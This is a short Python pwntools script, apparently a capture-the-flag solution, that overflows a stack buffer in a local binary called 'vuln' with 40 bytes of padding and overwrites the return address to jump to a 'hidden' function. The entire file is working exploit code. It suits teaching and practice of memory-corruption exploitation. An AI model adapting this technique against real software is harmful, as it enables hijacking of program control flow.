#!/usr/bin/env python2

from pwn import *

e = ELF("vuln")
#hidden_address = e.symbols["hidden"]
hidden_address = 0x40057b
print "hidden: 0x{:016x}".format(hidden_address)

offset = 40
payload = offset * "A" + p64(hidden_address)
print "".join("\\x{:02x}".format(ord(i)) for i in payload)

io = process("./vuln")
#gdb.attach(io)
io.sendline(payload)
io.interactive()
